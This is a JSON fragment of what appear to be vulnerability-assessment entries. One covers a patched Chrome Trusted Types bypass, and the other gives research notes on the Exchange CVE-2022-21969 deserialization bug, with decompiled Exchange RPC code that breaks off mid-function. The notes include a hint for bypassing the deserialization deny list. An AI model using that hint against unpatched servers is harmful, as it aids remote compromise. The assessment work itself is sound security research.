      "document": "Mitigating aspect to consider here is the flaws were **patched in more recent versions of Chrome and derivatives after 100.0.4892.0**\r\n\r\nUse of **.nodeValue** and **.textContent** to set **attribute properties** does not take an Exception-State since internal use of Attr::SetAttribute is not enforcing Trusted Type check as set by the HTTP header used to set CSP policy for Trusted Types. The nature of this vulnerability asks also to verify all other attribute methods to use Exception-State to ensure CSP Trusted Type checking in Chrome based browsers.\r\n\r\nThe resource example shows use of .nodeValue and .textContent to introduce DOM based-XSS,  this though the flaw permitted for any javascript to execute.\r\n\r\nresource: https://bugs.chromium.org/p/chromium/issues/detail?id=1298122\r\nsee [comment 7 for a link to the WebIDL discussion](https://github.com/w3c/webappsec-trusted-types/issues/248#issuecomment-576373688) where the flaw was likely introduced in case 2 Attr Node\r\n\r\n",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Impact",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "d4c71078-e234-47d2-a361-5d15cacc410b",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "0a7dd7b4-3522-4b79-b4a6-3b2a86b2eade",
      "created": "2022-07-10T07:02:53.30505Z",
      "revisionDate": "2022-07-10T07:02:53.30443Z",
      "document": "There is a nice writeup on this at https://medium.com/@frycos/searching-for-deserialization-protection-bypasses-in-microsoft-exchange-cve-2022-21969-bfa38f63a62d. The bug appears to be a deserialization bug that occurs when loading a specific file, however according to the demo video at https://gist.github.com/Frycos/a446d86d75c09330d77f37ca28923ddd it seems to be more of a local attack. That being said it would grant you an LPE to SYSTEM if you were able to trigger it. Furthermore Frycos mentions that he thinks Microsoft didn't fix the root issue when he wrote the blog (as of January 12th 2022), so its possible the root issue wasn't fixed, though Frycos mentioned he didn't look into this further.\r\n\r\nFrom https://twitter.com/MCKSysAr/status/1524518517990727683 it does seem like at the very least some exploitation attempts have been made to try exploit this although writing to ` C:\\Program Files\\Microsoft\\Exchange Server\\V15\\UnifiedMessaging\\voicemail` to trigger the bug via making it process a voicemail has proven to be difficult to do. It does however note my tip, shown later in this writeup, of how to bypass the deny list by using `System.Runtime.Remoting.ObjRef` as was pointed out online, was valid.\r\n\r\nWhat follows below is some of my notes that I wrote up a while back and never published. Hopefully they are of help to someone.\r\n\r\n# Overview\r\n## Background info\r\nDeserialization vulnerability leading to RCE potentially.\r\nGot a CVSS 3.1 score of 9.0 with a temporal score metric score of 7.8.\r\n\r\nInteresting that it mentions the attack vector is Adjacent and the article notes that this may be only cause of the way that he exploited it and may indicate they didn't fix the root issue.\r\n\r\nLow attack complexity and low privileges required seems to indicate it may be authenticated but you don't need many privileges??? I need to check on this further.\r\n\r\nHigh impact on everything else suggest this is a full compromise; this would be in line with leaking the hash.\r\n\r\n## Affected\r\n- Microsoft Exchange Server 2019 Cumulative Update 11 prior to January 2022 security update.\r\n- Microsoft Exchange Server 2019 Cumulative Update 10 prior to January 2022 security update.\r\n- Microsoft Exchange Server 2016 Cumulative Update 22 prior to January 2022 security update.\r\n- Microsoft Exchange Server 2016 Cumulative Update 21 prior to January 2022 security update.\r\n- Microsoft Exchange Server 2013 Cumulative Update 23 prior to January 2022 security update.\r\n\r\n## Fixed By\r\nKB5008631\r\n\r\n## Other vulns fixed in same patch\r\nCVE-2022-21846 <- NSA reported this one.\r\nCVE-2022-21855 <- Reported by Andrew Ruddick of MSRC.\r\n\r\n\r\n# Writeup Review\r\nOriginal writeup: https://www.instapaper.com/read/1487196325\r\n\r\nWe have well known *sinks* in [[.NET]] whereby one can make deserialization calls from unprotected formatters such as `BinaryFormatter`. These formatters as noted in [[CVE-2021-42321]] don't have any `SerializationBinder` or similar binders attached to them, which means that they are open to deserialize whatever they like, without any binder limiting them to what they can deserialize.\r\n\r\nInitial search for vulnerabilities took place around Exchange's `Rpc` functions, which use a binary protocol created by Microsoft for communication instead of using normal HTTP requests.\r\n\r\nLooking around we can see `Microsoft.Exchange.Rpc.ExchangeCertificates.ExchangeCertificateRpcServer` contains several function prototypes:\r\n\r\n```c#\r\n// Microsoft.Exchange.Rpc.ExchangeCertificate.ExchangeCertificateRpcServer  \r\nusing System;  \r\nusing System.Security;  \r\nusing Microsoft.Exchange.Rpc;  \r\n  \r\ninternal abstract class ExchangeCertificateRpcServer : RpcServerBase  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0public unsafe static IntPtr RpcIntfHandle = (IntPtr)<Module>.IExchangeCertificate_v1_0_s_ifspec;  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public abstract byte[] GetCertificate(int version, byte[] pInBytes);  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public abstract byte[] CreateCertificate(int version, byte[] pInBytes);  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public abstract byte[] RemoveCertificate(int version, byte[] pInBytes);  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public abstract byte[] ExportCertificate(int version, byte[] pInBytes, SecureString password);  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public abstract byte[] ImportCertificate(int version, byte[] pInBytes, SecureString password);  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public abstract byte[] EnableCertificate(int version, byte[] pInBytes);  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public ExchangeCertificateRpcServer()  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n}\r\n```\r\n\r\nThese are then implemented in `Microsoft.Exchange.Servicelets.ExchangeCertificate.ExchangeCertificateServer`.\r\n\r\n```c#\r\n// Microsoft.Exchange.Servicelets.ExchangeCertificate.ExchangeCertificateServer  \r\nusing System;  \r\nusing System.Security;  \r\nusing System.Security.AccessControl;  \r\nusing System.Security.Principal;  \r\nusing Microsoft.Exchange.Management.SystemConfigurationTasks;  \r\nusing Microsoft.Exchange.Rpc;  \r\nusing Microsoft.Exchange.Rpc.ExchangeCertificate;  \r\nusing Microsoft.Exchange.Servicelets.ExchangeCertificate;  \r\n  \r\ninternal class ExchangeCertificateServer : ExchangeCertificateRpcServer  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0internal const string RequestStoreName = \"REQUEST\";  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0private static ExchangeCertificateServer server;  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public static bool Start(out Exception e)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0e = null;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0FileSystemAccessRule accessRule = new FileSystemAccessRule(securityIdentifier, FileSystemRights.Read, AccessControlType.Allow);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0FileSecurity fileSecurity = new FileSecurity();  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0fileSecurity.SetOwner(securityIdentifier);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0fileSecurity.SetAccessRule(accessRule);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0try  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0server = (ExchangeCertificateServer)RpcServerBase.RegisterServer(typeof(ExchangeCertificateServer), fileSecurity, 1u, isLocalOnly: false);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return true;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0catch (RpcException ex)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0RpcException ex2 = (RpcException)(e = ex);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return false;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public static void Stop()  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (server != null)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0RpcServerBase.StopServer(ExchangeCertificateRpcServer.RpcIntfHandle);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0server = null;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public override byte[] CreateCertificate(int version, byte[] inputBlob)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return ExchangeCertificateServerHelper.CreateCertificate(ExchangeCertificateRpcVersion.Version1, inputBlob);  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public override byte[] GetCertificate(int version, byte[] inputBlob)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return ExchangeCertificateServerHelper.GetCertificate(ExchangeCertificateRpcVersion.Version1, inputBlob);  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public override byte[] RemoveCertificate(int version, byte[] inputBlob)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return ExchangeCertificateServerHelper.RemoveCertificate(ExchangeCertificateRpcVersion.Version1, inputBlob);  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public override byte[] ExportCertificate(int version, byte[] inputBlob, SecureString password)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return ExchangeCertificateServerHelper.ExportCertificate(ExchangeCertificateRpcVersion.Version1, inputBlob, password);  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public override byte[] ImportCertificate(int version, byte[] inputBlob, SecureString password)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return ExchangeCertificateServerHelper.ImportCertificate(ExchangeCertificateRpcVersion.Version1, inputBlob, password);  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public override byte[] EnableCertificate(int version, byte[] inputBlob)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return ExchangeCertificateServerHelper.EnableCertificate(ExchangeCertificateRpcVersion.Version1, inputBlob);  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n}\r\n```\r\n\r\nExamining these functions we can see a lot of them take a byte array input named `byte[] inputBlob`. If we follow the `ImportCertificate()` function here as an example we can see that the implementation will call into `Microsoft.Exchange.Servicelets.ExchangeCertificate.ExchangeCertificateServerHelper`, as is also true for the other functions.\r\n\r\n```c#\r\n// Microsoft.Exchange.Servicelets.ExchangeCertificate.ExchangeCertificateServerHelper  \r\nusing System;  \r\nusing System.Collections.Generic;  \r\nusing System.Management.Automation;  \r\nusing System.Security;  \r\nusing System.Security.Cryptography;  \r\nusing System.Security.Cryptography.X509Certificates;  \r\nusing System.Text;  \r\nusing Microsoft.Exchange.Data;  \r\nusing Microsoft.Exchange.Data.Common;  \r\nusing Microsoft.Exchange.Data.Directory;  \r\nusing Microsoft.Exchange.Data.Directory.Management;  \r\nusing Microsoft.Exchange.Data.Directory.SystemConfiguration;  \r\nusing Microsoft.Exchange.Extensions;  \r\nusing Microsoft.Exchange.Management.FederationProvisioning;  \r\nusing Microsoft.Exchange.Management.Metabase;  \r\nusing Microsoft.Exchange.Management.SystemConfigurationTasks;  \r\nusing Microsoft.Exchange.Management.Tasks;  \r\nusing Microsoft.Exchange.Net;  \r\nusing Microsoft.Exchange.Security.Cryptography.X509Certificates;  \r\nusing Microsoft.Exchange.Servicelets.ExchangeCertificate;  \r\n  \r\ninternal class ExchangeCertificateServerHelper  \r\n{  \r\n   \r\n... \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public static byte[] ImportCertificate(ExchangeCertificateRpcVersion rpcVersion, byte[] inputBlob, SecureString password)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0bool flag = false;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ExchangeCertificateRpc exchangeCertificateRpc = new ExchangeCertificateRpc(rpcVersion, inputBlob, null);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (string.IsNullOrEmpty(exchangeCertificateRpc.ImportCert))  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return ExchangeCertificateRpc.SerializeError(rpcVersion, Strings.ImportCertificateDataInvalid, ErrorCategory.ReadError);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Server server = null;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ITopologyConfigurationSession topologyConfigurationSession = DirectorySessionFactory.Default.CreateTopologyConfigurationSession(ConsistencyMode.IgnoreInvalid, ADSessionSettings.FromRootOrgScopeSet(), 1159, \"ImportCertificate\", \"d:\\\\dbs\\\\sh\\\\e19dt\\\\1103_100001\\\\cmd\\\\c\\\\sources\\\\Dev\\\\Management\\\\src\\\\ServiceHost\\\\Servicelets\\\\ExchangeCertificate\\\\Program\\\\ExchangeCertificateServer.cs\");  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0try  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0server = ManageExchangeCertificate.FindLocalServer(topologyConfigurationSession);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0catch (LocalServerNotFoundException)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0flag = true;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (flag || !ManageExchangeCertificate.IsServerRoleSupported(server))  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return ExchangeCertificateRpc.SerializeError(rpcVersion, Strings.RoleDoesNotSupportExchangeCertificateTasksException, ErrorCategory.InvalidOperation);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0X509Store x509Store = new X509Store(StoreName.My, StoreLocation.LocalMachine);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0try  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0x509Store.Open(OpenFlags.ReadWrite | OpenFlags.OpenExistingOnly);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0catch (CryptographicException)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0x509Store = null;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0List<ServiceData> installed = new List<ServiceData>();  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0GetInstalledRoles(topologyConfigurationSession, server, installed);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0try  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0byte[] array = null;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (CertificateEnroller.TryAcceptPkcs7(exchangeCertificateRpc.ImportCert, out var thumbprint, out var untrustedRoot))  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0X509Certificate2Collection x509Certificate2Collection = x509Store.Certificates.Find(X509FindType.FindByThumbprint, thumbprint, validOnly: false);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (x509Certificate2Collection.Count > 0)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (!string.IsNullOrEmpty(exchangeCertificateRpc.ImportDescription))  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0x509Certificate2Collection[0].FriendlyName = exchangeCertificateRpc.ImportDescription;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ExchangeCertificate exchangeCertificate = new ExchangeCertificate(x509Certificate2Collection[0]);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0UpdateServices(exchangeCertificate, server, installed);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0exchangeCertificateRpc.ReturnCert = exchangeCertificate;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return exchangeCertificateRpc.SerializeOutputParameters(rpcVersion);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (untrustedRoot)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return ExchangeCertificateRpc.SerializeError(rpcVersion, Strings.ImportCertificateUntrustedRoot, ErrorCategory.ReadError);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0try  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0array = Convert.FromBase64String(exchangeCertificateRpc.ImportCert);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0catch (FormatException)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return ExchangeCertificateRpc.SerializeError(rpcVersion, Strings.ImportCertificateBase64DataInvalid, ErrorCategory.ReadError);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0X509Certificate2 x509Certificate = null;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0try  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0X509KeyStorageFlags x509KeyStorageFlags = X509KeyStorageFlags.MachineKeySet | X509KeyStorageFlags.PersistKeySet;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0bool flag2 = password == null || password.Length == 0;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0X509Certificate2Collection x509Certificate2Collection2 = new X509Certificate2Collection();  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (exchangeCertificateRpc.ImportExportable)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0x509KeyStorageFlags |= X509KeyStorageFlags.Exportable;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0x509Certificate2Collection2.Import(array, flag2 ? null : password.AsUnsecureString(), x509KeyStorageFlags);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0x509Certificate = ManageExchangeCertificate.FindImportedCertificate(x509Certificate2Collection2);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0catch (CryptographicException)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return ExchangeCertificateRpc.SerializeError(rpcVersion, Strings.ImportCertificateDataInvalid, ErrorCategory.ReadError);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (x509Certificate == null)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return ExchangeCertificateRpc.SerializeError(rpcVersion, Strings.ImportCertificateDataInvalid, ErrorCategory.ReadError);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (!string.IsNullOrEmpty(exchangeCertificateRpc.ImportDescription))  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0x509Certificate.FriendlyName = exchangeCertificateRpc.ImportDescription;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (x509Store.Certificates.Find(X509FindType.FindByThumbprint, x509Certificate.Thumbprint, validOnly: false).Count > 0)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return ExchangeCertificateRpc.SerializeError(rpcVersion, Strings.ImportCertificateAlreadyExists(x509Certificate.Thumbprint), ErrorCategory.WriteError);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  